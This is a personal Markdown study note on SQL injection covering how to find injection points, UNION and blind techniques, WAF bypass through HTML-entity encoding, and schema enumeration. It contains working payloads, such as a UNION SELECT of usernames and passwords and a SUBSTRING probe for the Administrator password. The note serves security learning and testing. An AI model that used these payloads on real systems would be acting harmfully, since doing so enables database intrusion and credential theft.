
### General Notes

> Unauthorized user take control over SQL statements used by a web application.
> To explot SQL Injections, first find the injection point, and then craft a payload to take control over a query.
> Try TRUE and FALSE injections to check which one works.

> SQL queries inside web applications must connect to the database, submit the query, and then retrieve the results.

> Can use [[SQLMap]] to automate this test.
> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### Finding SQL Injections

>Can be used using [[Burp Suite]]'s web vulnerability scanner.
>The most common other locations where SQL injection arises are:
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

> Test all user inputs.
> Test these areas: 
* GET parameters.
* POST parameters.  //Use [[Burp Suite]] proxy
* [[HTTP]] headers.

---

#### Union Based Injections

> The queries must return the same amount of columns as the original one.
> The queries must return data of the same or allowed data type as the original one.
> Getting a 200 response code indicates the right number of columns.

##### Number of Columns using Added `NULL,`
>  When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word NULL or an empty string.
```
UNION SELECT NULL
```
> For oracle, need to add FROM for every SELECT. Use the built in DUAL table.

##### Number of Columns using `ORDER BY`
> Keep changing the `ORDER BY` index until an error is recieved.


##### Checking the Data Type of a column
> Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.
> If it succeeds, then we know the data type of that column.
> We can then get exact data we want if we replace that data in the correct column field. It will be produced in an extra row.

---

### Blind SQL Injections

> Application doesn't return the results of the query or details of errors in its response.

> To detect a blind vulnerability:
1. Change logic of query to trigger a detectable difference. Such as boolean logic or generate erros such as dividing by zero.
2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.


##### Tracking Cookies
> Some applications use tracking cookies to gather data about usage and users.
> They are processed by a SQL query such as: 
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
> The behaviour of the website can then be used to determine how the injection is vulnerable.
> Triggering different responses through false and true conditions.

---

### Payloads

> Try injecting: 
* String terminators: `'` and `"`.
* Other SQL commands: `SELECT`, `UNION`.
* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .

##### Example Payloads
> `' OR 'a'='a ` .
> `' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a `.
> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
> `2' AND 1=1; -- - `.

---

### Different Inputs and Obfuscating Attacks

> Obfuscating is using [[Web Encoding]] to perform attacks that could be blocked using web application [[Firewall]]s.
> Some websites take JSON or XML in their queries to ask the database.

> For XML use `hex-entities` encoding in [[Burp Suite]]'s hackvertor extension to bypass.

> Can encode some letters of the query to bypass these defense mechanisms.
```
SELECT * FROM information_schema.tables
&#x53;ELECT * FROM information_schema.tables
```
> This is encoding using an HTML entity of a hex.
> This will be decoded first server side, and then passed to the SQL interpreter that communicates with the database.

---

### Enumerating Database

> Get the database information and version.
```
SELECT BANNER FROM v$version;    //oracle
SELECT version FROM v$instance   //oracle
SELECT @@version  //microsoft and MySQL
SELECT version() // PostgreSQL
```

> Getting the tables and their columns. Works on most databases.
```
SELECT * FROM information_schema.tables;
```


##### Using Information_schema

> Can use the `information_schema` database present in most systems (NOT IN ORACLE) to list the tables
```
SELECT * FROM information_schema.tables 
```
> The elements in this database are:
* TABLE_NAME
* TABLE_CATALOG
* TABLE_SCHEMA
* TABLE_TYPE

> Can use one of the tables output in the previous command to display the columns and data types of that table
```
SELECT * FROM information_schema.columns WHERE table_name= <>
```
> The elements in this database are same as above and:
* COLUMN_NAME
* DATA_TYPE

##### Using Information_schema Equivalent For Oracle

> List all tables using `all_tables`
```
SELECT * FROM all_tables
```
* TABLE_NAME

> List columns using `all_tab_columns`
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
* COLUMN_NAME

---

### Extra Info

> Commands to identify first character of username.
```
select user(); // returns the current user
select substring(string,position,length); //substring from the position and takes length many chrs.
example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

> To concatenate results into one column
* Oracle and PostgreSQL
```
SELECT username || ':' || password FROM users
```
* Microsoft
```
SELECT username + password FROM users
```
* MySQL (space)
```
SELECT username password FROM users
```

---
